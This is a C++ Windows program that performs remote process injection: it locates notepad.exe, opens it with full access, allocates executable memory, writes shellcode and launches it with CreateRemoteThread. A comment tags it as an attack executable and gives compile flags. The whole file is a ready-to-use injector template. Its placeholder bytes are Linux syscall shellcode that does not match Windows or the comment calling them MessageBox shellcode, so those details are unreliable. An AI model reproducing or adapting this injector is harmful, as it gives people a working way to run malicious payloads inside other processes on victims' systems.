#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
// x86_64-w64-mingw32-g++ inject.cpp -o inject.exe -static -static-libgcc -static-libstdc++ -s
// Atk exe -> OpenProcess (target process) -> VirtualAllocEx (target process) -> WriteProcessMemory (shellcode) -> CreateRemoteThread (shellcode)
DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 pe32;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe32));
    }

    CloseHandle(snapshot);
    return 0;
}

int main() {

    const char* targetProcess = "notepad.exe";

    // Example shellcode (MessageBox shellcode placeholder)
    unsigned char shellcode[] =
        "\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05"; // exit shellcode placeholder

    SIZE_T shellcodeSize = sizeof(shellcode);

    // 1️⃣ Get PID
    DWORD pid = GetProcessIdByName(targetProcess);

    if (pid == 0) {
        std::cout << "Process not found\n";
        return -1;
    }

    std::cout << "[+] PID: " << pid << std::endl;

    // 2️⃣ Obtain handle to process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (!hProcess) {
        std::cout << "[-] Failed to open process\n";
        return -1;
    }

    std::cout << "[+] Handle obtained\n";

    // 3️⃣ Allocate memory in remote process
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    std::cout << "[+] Memory allocated: " << remoteBuffer << std::endl;

    // 4️⃣ Write shellcode
    WriteProcessMemory(
        hProcess,
        remoteBuffer,
        shellcode,
        shellcodeSize,
        NULL
    );

    std::cout << "[+] Shellcode written\n";

    // 5️⃣ Create remote thread
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteBuffer,
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        std::cout << "[-] Failed to create remote thread\n";
        return -1;
    }

    std::cout << "[+] Remote thread created\n";

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
